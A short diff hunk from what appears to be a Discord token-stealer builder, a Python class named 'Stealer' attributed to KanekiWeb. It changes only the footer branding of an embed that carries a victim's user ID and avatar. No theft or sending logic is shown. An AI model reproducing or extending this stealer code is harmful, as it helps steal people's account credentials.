@@ -159,7 +159,7 @@ class Stealer():
                         "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                     },
                     "footer": {
-                        "text": f"Stealer Builder by KanekiWeb  -  discord.gg/haxor",
+                        "text": f"Stealer Builder by KanekiWeb  -  kanekiweb.tk",
                         "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                     },
                     "image": {
